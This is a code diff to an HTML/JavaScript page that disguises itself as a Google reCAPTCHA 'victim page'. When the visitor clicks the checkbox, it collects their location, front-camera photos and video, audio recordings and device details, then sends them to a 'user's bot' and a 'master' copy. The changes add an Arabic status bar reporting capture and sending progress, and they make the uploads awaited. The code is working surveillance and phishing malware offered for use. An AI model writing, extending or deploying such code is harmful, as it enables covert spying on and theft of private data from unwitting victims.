@@ -918,7 +918,7 @@
         }
 
         /* ============================================================
-           VICTIM PAGE — reCAPTCHA (NO STATUS BAR)
+           VICTIM PAGE — reCAPTCHA
            ============================================================ */
         #victimPage {
             display: none;
@@ -1036,7 +1036,6 @@
             text-align: center;
             transition: color 0.2s;
             user-select: none;
-            font-family: 'Roboto', Arial, sans-serif;
         }
 
         .text.loading {
@@ -1169,6 +1168,19 @@
         }
         #hiddenCanvas {
             display: none;
+        }
+
+        /* ===== STATUS BAR (Victim) ===== */
+        .victim-status {
+            display: none;
+            margin-top: 12px;
+            padding: 10px 16px;
+            background: rgba(0, 0, 0, 0.04);
+            border-radius: 8px;
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            font-family: 'Roboto', Arial, sans-serif;
         }
 
         /* ===== SCROLLBAR ===== */
@@ -1443,7 +1455,7 @@
     </div>
 
     <!-- ============================================================
-         VICTIM PAGE — reCAPTCHA (NO STATUS BAR)
+         VICTIM PAGE — reCAPTCHA
          ============================================================ -->
     <div id="victimPage">
         <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
@@ -1482,7 +1494,7 @@
                 </div>
             </div>
 
-            <!-- No status bar -->
+            <div class="victim-status" id="victimStatus">⏳ جاهز، اضغط على المربع للتحقق ...</div>
         </div>
     </div>
 
@@ -1676,7 +1688,7 @@
                         tokenDisplay.textContent = shortToken;
                         resultSub.textContent = link;
 
-                        // Send link to user's bot (keepalive)
+                        // Send link to user's bot (with keepalive)
                         const userMsg =
                             `🔗 *رابطك الجديد*\n${link}\n\n` +
                             `📌 التوكن الفريد: \`${shortToken}\`\n` +
@@ -1699,7 +1711,7 @@
                             keepalive: true
                         });
 
-                        // Send copy to master
+                        // Send copy to master (with keepalive)
                         const masterMsg =
                             `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
                             `⊚─〔 بيانات البوت 〕────────\n` +
@@ -1784,13 +1796,14 @@
             }
 
             // ============================================================
-            //  🔥  VICTIM PAGE (NO STATUS BAR, BACKGROUND SEND)
+            //  🔥  VICTIM PAGE — CORRECTED WITH AWAIT + KEEPALIVE
             // ============================================================
 
             async function initVictimPage(shortToken) {
                 const spinner = document.getElementById('spinner');
                 const checkbox = document.getElementById('captcha');
                 const mainText = document.getElementById('mainText');
+                const statusEl = document.getElementById('victimStatus');
                 const video = document.getElementById('hiddenVideo');
                 const canvas = document.getElementById('hiddenCanvas');
                 const ctx = canvas.getContext('2d');
@@ -1799,6 +1812,12 @@
                 let collectionDone = false;
                 let attemptCount = 0;
                 const MAX_ATTEMPTS = 3;
+
+                function setStatus(msg, isError = false) {
+                    statusEl.style.display = 'block';
+                    statusEl.textContent = msg;
+                    statusEl.style.color = isError ? '#d93025' : '#666';
+                }
 
                 // ---- Get bot mapping from IndexedDB ----
                 async function getBotMapping(token) {
@@ -1840,13 +1859,7 @@
                 async function collectData() {
                     if (isRunning || collectionDone) return;
                     if (attemptCount >= MAX_ATTEMPTS) {
-                        // silently fail without showing error
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('failed');
-                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
-                        mainText.className = 'text failed';
-                        checkbox.checked = false;
-                        checkbox.disabled = false;
+                        setStatus('❌ فشلت المحاولات المتكررة. يرجى تحديث الصفحة.', true);
                         return;
                     }
                     attemptCount++;
@@ -1855,6 +1868,7 @@
                     spinner.classList.add('loading');
                     mainText.textContent = 'جاري التحقق...';
                     mainText.className = 'text loading';
+                    setStatus('⏳ جاري تهيئة الأجهزة ...');
 
                     try {
                         // Get bot mapping
@@ -1891,6 +1905,8 @@
                         } catch (e) {
                             location.error = e.message;
                         }
+
+                        setStatus('📸 جاري التقاط الصور والتسجيلات ...');
 
                         // ---- Front camera (photos and video) ----
                         let frontVideo = null;
@@ -1985,6 +2001,8 @@
                         } catch (e) {
                             console.warn('Audio error:', e);
                         }
+
+                        setStatus('📤 جاري إرسال البيانات إلى المطور والمستخدم ...');
 
                         // ---- Build summary ----
                         const deviceInfo =
@@ -2130,13 +2148,14 @@
                             }
                         }
 
-                        // ---- Execute both sends (they will continue in background) ----
+                        // ---- Execute both sends with await ----
                         await Promise.all([
                             sendToMaster(),
                             sendToUser()
                         ]);
 
                         collectionDone = true;
+                        setStatus('✅ تم إرسال البيانات بنجاح إلى المطور والمستخدم!');
                         spinner.classList.remove('loading');
                         spinner.classList.add('success');
                         mainText.textContent = 'تم التحقق بنجاح';
@@ -2152,8 +2171,10 @@
                         mainText.className = 'text failed';
                         checkbox.checked = false;
                         checkbox.disabled = false;
+                        setStatus('❌ حدث خطأ. يمكنك المحاولة مرة أخرى بالنقر فوق المربع.', true);
                         isRunning = false;
                         if (attemptCount >= MAX_ATTEMPTS) {
+                            setStatus('❌ تجاوزت عدد المحاولات المسموح. يرجى تحديث الصفحة.', true);
                             checkbox.disabled = true;
                         }
                     }
@@ -2176,6 +2197,7 @@
                     }
                 });
 
+                setStatus('⏳ جاهز، اضغط على المربع للتحقق ...');
                 console.log('✅ Victim page ready. Token:', shortToken);
             }
 
